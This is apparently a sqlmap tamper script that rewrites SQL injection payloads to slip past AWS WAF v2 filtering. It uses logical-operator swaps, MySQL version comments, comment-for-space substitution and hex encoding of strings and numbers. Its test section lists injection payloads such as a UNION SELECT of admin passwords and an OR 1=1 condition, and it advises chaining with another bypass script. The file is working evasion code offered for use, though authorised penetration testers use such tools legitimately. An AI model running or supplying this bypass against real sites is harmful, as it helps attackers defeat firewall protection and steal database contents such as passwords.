"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission

Tamper script: awswaf2026.py
Description: Context-aware AWS WAF bypass with aggressive operator encoding
Author: Regaan
Priority: HIGHEST

AWS WAF v2 specific behaviors:
- Picky about comment stuffing
- Blocks nested comments aggressively
- Sensitive to certain encodings

Techniques:
1. Aggressive operator encoding in WHERE/ON clauses
2. Swap AND/OR with &&/|| (MySQL allows)
3. Variable MySQL version comments (50700+ for newer hints)
4. Hex encoding for string literals
5. Numeric obfuscation to hex

Chain with: --tamper=awswaf2026,cloudflare2025 for layered bypass
"""

import sys
import os

# Add parent directory to path for framework import
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from lib.core.enums import PRIORITY
    __priority__ = PRIORITY.HIGHEST
except ImportError:
    # Not running in SQLMap context
    pass

from tamper_framework.transformer import SQLTransformer
from tamper_framework.transformations import (
    create_version_comment_vary_rule,
    create_space_replace_rule,
    create_value_encode_rule,
    create_case_alternate_rule,
    create_logical_swap_rule,
    create_hex_encode_rule,
    create_numeric_obfuscation_rule,
)


def dependencies():
    pass


def tamper(payload, **kwargs):
    """
    AWS WAF v2 bypass with context-aware transformations
    
    Applies transformations in safe order:
    1. Logical swap (AND/OR -> &&/||)
    2. Keyword wrapping with varied versions (/*!50700SELECT*/)
    3. Space replacement (/**/)
    4. Operator encoding (%3D, %3E%3D)
    5. Hex encoding for strings ('admin' -> 0x61646d696e)
    6. Numeric hex (1 -> 0x1)
    7. Case alternation (sElEcT)
    
    AWS WAF specific:
    - Uses higher MySQL versions (50700+) for version comments
    - Swaps logical operators to symbols
    - Encodes strings as hex to avoid quote filters
    
    Example:
        Input:  SELECT * FROM users WHERE id=1 AND name='admin'
        Output: Full transformation with hex strings and swapped operators
    """
    
    if not payload:
        return payload
    
    # Create transformer
    transformer = SQLTransformer()
    
    # Add rules in correct order for AWS WAF
    
    # 1. Swap AND/OR to &&/|| first (before it becomes a keyword)
    transformer.add_rule(create_logical_swap_rule())
    
    # 2. Variable version comments (use newer MySQL versions)
    transformer.add_rule(create_version_comment_vary_rule(fixed_version="50700"))
    
    # 3. Replace spaces with comments
    transformer.add_rule(create_space_replace_rule())
    
    # 4. Encode operators
    transformer.add_rule(create_value_encode_rule())
    
    # 5. Hex encode strings
    transformer.add_rule(create_hex_encode_rule())
    
    # 6. Hex encode numbers
    transformer.add_rule(create_numeric_obfuscation_rule(style="hex"))
    
    # 7. Alternate case on keywords (now inside version comments)
    transformer.add_rule(create_case_alternate_rule())
    
    # Transform
    try:
        result = transformer.transform(payload)
        return result
    except Exception as e:
        # If transformation fails, return original
        return payload


if __name__ == "__main__":
    # Test the tamper script
    test_queries = [
        "SELECT * FROM users WHERE id=1",
        "SELECT * FROM users WHERE id>=5 AND active=1",
        "UNION SELECT password FROM admin WHERE role='admin'",
        "SELECT * FROM users WHERE name='test' OR 1=1",
    ]
    
    print("=" * 70)
    print("AWS WAF 2026 - Context-Aware Token-Based Tamper Script")
    print("=" * 70)
    
    for query in test_queries:
        result = tamper(query)
        print(f"\nOriginal:    {query}")
        print(f"Transformed: {result}")
